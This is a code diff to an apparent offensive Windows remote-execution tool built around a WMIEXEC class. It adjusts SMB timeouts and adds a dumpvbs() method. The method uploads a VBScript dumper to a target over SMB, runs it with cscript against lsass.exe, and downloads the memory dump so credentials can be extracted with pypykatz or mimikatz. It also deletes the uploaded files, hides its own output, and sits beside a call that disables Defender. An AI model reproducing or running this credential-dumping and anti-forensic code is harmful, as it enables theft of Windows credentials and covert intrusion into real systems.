@@ -118,7 +118,7 @@ class WMIEXEC:
     def execute(self, command, output=False):
         self.__retOutput = output
         if self.__retOutput:
-            self.__smbconnection.setTimeout(100000)
+            self.__smbconnection.setTimeout(900)
 
         if self.__killDefender:
             self.disable_defender()
@@ -134,7 +134,7 @@ class WMIEXEC:
     def execute1(self, command, output=False):
         self.__retOutput = output
         if self.__retOutput:
-            self.__smbconnection.setTimeout(100000)
+            self.__smbconnection.setTimeout(900)
 
         if self.__killDefender:
             self.disable_defender()
@@ -304,6 +304,45 @@ class WMIEXEC:
         #self.logger.highlight('i.e.    pypykatz lsa minidump safe.dmp')
         return str(cfg.DUMP_PATH)
 
+    def dumpvbs(self):
+        """Dump lsass and retrieve output dmp file.
+
+        Thanks https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
+        """
+        from contextlib import redirect_stdout
+        import io
+
+        if not cfg.DUMP_VBS.is_file():
+            self.logger.error('dumper.vbs not found at {}'.format(str(cfg.DUMP_VBS)))
+            self.logger.error('Place dumper in location or update config.py and rebuild'.format(str(cfg.DUMP_VBS)))
+            return
+        self.__remoteshell = RemoteShell(self.__share, self.__win32Process, self.__smbconnection)
+
+        self.logger.announce('Uploading dumper')
+        
+
+        self.__remoteshell.do_put(str(cfg.DUMP_VBS)) # default path is /.cmx/dumper.vbs
+        time.sleep(1)
+
+        self.logger.announce('Waiting for dumper to finish')
+
+        f = io.StringIO()
+        with redirect_stdout(f): # lil hack to hide output
+            self.__remoteshell.onecmd('C:\\Windows\\System32\\cscript.exe dumper.vbs lsass.exe')
+        time.sleep(1)
+        
+        self.logger.announce('Downloading dump file to current directory')
+        self.__remoteshell.do_get('safety.bin')
+
+        self.logger.success('Success, now cleaning up on target.')
+        with redirect_stdout(f):
+            self.__remoteshell.onecmd('del dumper.vbs')
+            self.__remoteshell.onecmd('del safety.bin')
+        self.__remoteshell.do_exit('')
+
+        #self.logger.highlight('Credentials can now be extracted using pypykatz or running mimikatz locally')
+        #self.logger.highlight('i.e.    pypykatz lsa minidump safe.dmp')
+        return str(cfg.DUMP_BIN)
 
 ###################################################################################################
 ###################################################################################################
